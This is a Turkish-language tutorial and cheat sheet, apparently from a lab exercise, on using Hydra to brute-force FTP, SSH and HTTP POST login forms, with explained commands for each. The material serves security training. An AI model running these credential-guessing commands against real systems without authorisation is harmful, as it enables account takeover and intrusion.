Hydra Komutları

Hydra'ya ilettiğimiz seçenekler, hangi servise (protokole) saldırdığımıza bağlı olarak değişir. Örneğin, kullanıcı adının `user` olduğu ve parola listesinin `passlist.txt` olduğu bir senaryoda FTP'ye brute force uygulamak istersek şu komutu kullanırız:

`hydra -l user -P passlist.txt ftp://MACHINE_IP`

Bu dağıtılmış makine için, Hydra'yı SSH ve bir web formu (POST metodu) üzerinde kullanmak için gereken komutlar aşağıdadır.

### SSH

`hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh`

|**Seçenek**|**Açıklama**|
|---|---|
|**-l**|Giriş için (SSH) kullanıcı adını belirtir|
|**-P**|Parola listesini belirtir|
|**-t**|Oluşturulacak thread (iş parçacığı) sayısını ayarlar|

Örneğin, `hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh` komutu şu argümanlarla çalışacaktır:

- Hydra, SSH için kullanıcı adı olarak `root` kullanacaktır.
    
- `passwords.txt` dosyasındaki parolaları deneyecektir.
    
- `-t 4` ile belirtildiği üzere paralel olarak çalışan dört thread olacaktır.
    

### Post Web Form

Hydra'yı web formlarına brute force uygulamak için de kullanabiliriz. Hangi tür istek yapıldığını bilmeniz gerekir; GET veya POST metotları yaygın olarak kullanılır. İstek türlerini görmek için tarayıcınızın ağ (network) sekmesini (geliştirici araçlarında) kullanabilir veya kaynak kodunu görüntüleyebilirsiniz.

`sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"`

|**Seçenek**|**Açıklama**|
|---|---|
|**-l**|(Web formu) girişi için kullanıcı adı|
|**-P**|Kullanılacak parola listesi|
|**http-post-form**|Formun tipi POST'tur|
|**<path>**|Giriş sayfası URL'si, örneğin `login.php`|
|**<login_credentials>**|Giriş için kullanılan kullanıcı adı ve parola, örneğin `username=^USER^&password=^PASS^`|
|**<invalid_response>**|Giriş başarısız olduğunda yanıtın bir parçası|
|**-V**|Her deneme için verbose (ayrıntılı) çıktı|

Aşağıda, bir POST giriş formuna brute force uygulamak için daha somut bir Hydra komutu örneği verilmiştir:

`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

- Giriş sayfası sadece `/` işaretidir, yani ana IP adresidir.
    
- `username`, kullanıcı adının girildiği form alanıdır.
    
- Belirtilen kullanıcı ad(lar)ı `^USER^` kısmının yerine geçecektir.
    
- `password`, parolanın girildiği form alanıdır.
    
- Sağlanan parolalar `^PASS^` kısmının yerine geçecektir.
    
- Son olarak, `F=incorrect`, giriş başarısız olduğunda sunucu yanıtında görünen bir dizidir (string).
    

Küçük bir not olarak; eğer web sunucusu varsayılan olmayan bir port numarasını dinliyorsa, `-s <port>` kullanarak port numarasını açıkça belirtebilirsiniz, örneğin:

`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V`

---

# 🛠️ Hydra Komut Rehberi (Obsidian)

## 🔑 Temel Parametreler

- **`-l`**: Tek bir kullanıcı adı belirtir.
    
- **`-L`**: Kullanıcı adlarını içeren bir liste belirtir.
    
- **`-p`**: Tek bir parola belirtir.
    
- **`-P`**: Parolaları içeren bir liste (**wordlist**) belirtir.
    
- **`-t`**: Paralel görev sayısı (Hız ayarı).
    

---

## 🚀 Önemli Servis Komutları

### 1. SSH Brute Force

Bash

```
hydra -l <username> -P /path/to/wordlist.txt <IP> -t 4 ssh
```

### 2. Web Form (POST) Brute Force

Web formlarına saldırırken form verilerini doğru eşleştirmek kritiktir.

Bash

```
hydra -l admin -P pass.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=invalid"
```

- **Path:** `/login.php`
    
- **Body:** `user=^USER^&pass=^PASS^`
    
- **Hata Mesajı:** `F=invalid` (Sayfada "invalid" yazısı çıkarsa denemeye devam et).
    

---

## 💡 İpuçları

- **Verbose Mode (`-V`):** Her denemeyi ekranda görmenizi sağlar.
    
- **Custom Port (`-s`):** Servis standart dışı bir portta (örn. 8080) çalışıyorsa kullanılır.
    
- **Success:** Hydra doğru parolayı bulduğunda terminalde yeşil veya belirgin bir satırla çıktı verecektir.